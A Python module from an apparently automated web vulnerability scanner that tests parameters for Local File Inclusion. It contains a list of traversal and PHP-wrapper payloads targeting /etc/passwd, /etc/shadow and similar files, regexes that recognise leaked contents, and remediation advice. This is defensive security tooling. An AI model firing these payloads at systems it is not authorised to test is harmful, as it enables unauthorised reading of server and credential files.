"""
LFI (Local File Inclusion) Detection Module

Detects path traversal and local file inclusion vulnerabilities.
"""

import re
from typing import List, Dict
import logging

from app.scanner.modules.base import BaseModule, VulnerabilityResult, Severity, Confidence
from app.scanner.core.requester import AsyncRequester, RequestMethod

logger = logging.getLogger(__name__)


# LFI Payloads
LFI_PAYLOADS = [
    # Basic traversal
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..\\..\\..\\etc\\passwd',

    # Null byte bypass (works on older PHP)
    '../../../etc/passwd%00',
    '../../../etc/passwd%00.php',
    '../../../etc/passwd%00.html',

    # Double encoding
    '..%252f..%252f..%252fetc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',

    # Filter bypass
    '....//....//....//etc/passwd',
    '..../..../..../etc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',

    # Windows files
    '..\\..\\..\\windows\\win.ini',
    '....\\\\....\\\\....\\\\windows\\\\win.ini',
    '../../../windows/win.ini',

    # Wrapper bypass (PHP)
    'php://filter/convert.base64-encode/resource=../../../etc/passwd',
    'php://filter/read=string.rot13/resource=../../../etc/passwd',

    # Common config files
    '../../../etc/shadow',
    '../../../etc/hosts',
    '../../../proc/self/environ',
    '../../../var/log/apache2/access.log',
    '../../../var/log/apache/access.log',
]

# Patterns indicating successful LFI
LFI_SUCCESS_PATTERNS = [
    # /etc/passwd
    r'root:.*:0:0:',
    r'daemon:.*:1:1:',
    r'bin:.*:2:2:',
    r'nobody:.*:65534:',

    # /etc/shadow
    r'root:\$[0-9a-z]+\$',

    # /etc/hosts
    r'127\.0\.0\.1\s+localhost',
    r'::1\s+localhost',

    # Windows win.ini
    r'\[fonts\]',
    r'\[extensions\]',
    r'\[mci extensions\]',

    # /proc/self/environ
    r'DOCUMENT_ROOT=',
    r'HTTP_HOST=',
    r'SERVER_SOFTWARE=',

    # Apache logs
    r'\d+\.\d+\.\d+\.\d+ - - \[',
]


class LFIModule(BaseModule):
    """
    LFI (Local File Inclusion) Detection Module

    Detects:
    - Path traversal vulnerabilities
    - Local file inclusion
    - PHP wrapper exploitation
    """

    name = "LFI Scanner"
    description = "Detects Local File Inclusion vulnerabilities"
    vulnerability_type = "lfi"
    cwe_id = "CWE-98"
    owasp_category = "A01:2021"

    # CVSS for LFI
    CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    CVSS_SCORE = 7.5

    def __init__(self):
        super().__init__()
        self._success_patterns = [
            re.compile(pattern, re.IGNORECASE | re.MULTILINE)
            for pattern in LFI_SUCCESS_PATTERNS
        ]

    async def check(self, *args, **kwargs) -> List[VulnerabilityResult]:
        """LFI requires active testing."""
        return []

    async def test(
            self,
            requester: AsyncRequester,
            url: str,
            parameter: str,
            original_value: str,
            method: str = 'GET'
    ) -> List[VulnerabilityResult]:
        """
        Test for LFI vulnerability.

        Args:
            requester: HTTP requester
            url: Target URL
            parameter: Parameter to test
            original_value: Original parameter value
            method: HTTP method

        Returns:
            List of LFI vulnerabilities found
        """
        results = []
        request_method = RequestMethod.POST if method.upper() == 'POST' else RequestMethod.GET

        # Get baseline response
        baseline = await requester.get(url, use_cache=True)
        if baseline.error:
            return results

        for payload in LFI_PAYLOADS[:10]:  # Test top payloads
            try:
                response, injected = await requester.test_payload(
                    url=url,
                    parameter=parameter,
                    payload=payload,
                    method=request_method,
                    original_value=''  # Replace value completely
                )

                if response.error:
                    continue

                # Check for LFI success
                file_found = self._check_lfi_success(response.body)

                if file_found:
                    vuln = self.create_vulnerability(
                        name="Local File Inclusion (LFI)",
                        severity=Severity.HIGH,
                        url=url,
                        description=(
                            f"The parameter '{parameter}' is vulnerable to Local File Inclusion. "
                            f"An attacker can read arbitrary files from the server, potentially "
                            f"exposing sensitive configuration, credentials, or source code."
                        ),
                        confidence=Confidence.CONFIRMED,
                        parameter=parameter,
                        method=method,
                        payload=payload,
                        evidence=f"Successfully read file. Pattern matched: {file_found}",
                        response_snippet=self.truncate(response.body, 300),
                        cvss_vector=self.CVSS_VECTOR,
                        cvss_score=self.CVSS_SCORE,
                        remediation=self._get_remediation(),
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
                        ]
                    )

                    results.append(vuln.to_dict())
                    break  # One confirmed finding is enough

            except Exception as e:
                logger.error(f"Error testing LFI payload: {e}")
                continue

        return results

    def _check_lfi_success(self, body: str) -> str:
        """Check if LFI was successful."""
        for pattern in self._success_patterns:
            match = pattern.search(body)
            if match:
                return match.group(0)[:50]
        return ""

    def _get_remediation(self) -> str:
        """Get remediation guidance."""
        return """
1. **Input Validation**:
   - Whitelist allowed file names/paths
   - Reject input containing path traversal sequences (../, ..\\ )
   - Validate file extensions

2. **Use Indirect References**:
   - Map user input to predefined file identifiers
   - Never use user input directly in file paths

3. **Chroot or Jail Environment**:
   - Restrict file access to specific directories
   - Use chroot on Unix systems

4. **Disable Dangerous Functions**:
   - PHP: Disable allow_url_include
   - Disable dangerous file functions when not needed

5. **Least Privilege**:
   - Run web server with minimal permissions
   - Restrict readable files/directories
"""


# Module interface functions
async def check(*args, **kwargs) -> List[Dict]:
    """Passive check interface."""
    return []


async def test(requester, url, parameter, value, method='GET') -> List[Dict]:
    """Active test interface."""
    module = LFIModule()
    return await module.test(requester, url, parameter, value, method)
